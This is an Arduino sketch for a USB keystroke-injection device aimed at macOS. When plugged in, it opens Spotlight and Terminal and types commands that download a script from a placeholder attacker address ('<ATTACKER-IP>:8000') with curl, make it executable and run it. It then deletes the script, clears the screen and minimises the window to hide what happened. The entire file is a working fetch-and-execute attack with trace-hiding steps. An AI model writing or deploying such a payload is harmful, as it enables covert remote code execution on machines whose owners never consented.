#include "Keyboard.h"

// MACROS =====================================================================
void printAndWait(char *input, unsigned long delayTime) {
  Keyboard.print(input);
  delay(delayTime);
}

void spawnTerminal() {
  // Open spotlight search
  commandKey(' ');

  // Open the terminal
  Keyboard.print("Terminal");
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
}

void commandKey(char key) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  delay(500);
  Keyboard.releaseAll();
}

// MAIN =======================================================================
void setup() {
  Keyboard.begin();
  delay(1000);

  // new tab incase there is a process running in current terminal
  spawnTerminal();
  commandKey('n');

  printAndWait("cd ~\n", 500);
  printAndWait("curl -O http://<ATTACKER-IP>:8000/script.sh\n", 1000);
  printAndWait("chmod +x script.sh\n", 100);
  printAndWait("./script.sh\n", 500);

  // buffer cleaning commands
  printAndWait("rm script.sh\n", 50);
  printAndWait("cd -\n", 50);
  printAndWait("clear\n", 50);
  commandKey('m');

  Keyboard.end();
}

void loop() {

}